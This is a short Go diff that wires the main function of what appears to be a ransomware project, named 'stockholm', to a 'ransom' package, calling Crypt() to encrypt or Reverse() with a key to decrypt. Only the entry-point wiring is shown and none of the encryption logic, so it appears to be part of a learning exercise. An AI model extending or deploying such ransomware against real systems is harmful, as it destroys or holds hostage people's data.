@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"os"
+	"stockholm/internal/logger"
+	"stockholm/pkg/ransom"
 
 	"github.com/pborman/getopt"
 )
@@ -28,5 +30,10 @@ func main() {
 		fmt.Fprintln(os.Stderr, "v0.0.1")
 		os.Exit(0)
 	}
-
+	logger.NewLogger(*s)
+	if *r != "" {
+		ransom.Reverse(*r)
+	} else {
+		ransom.Crypt()
+	}
 }
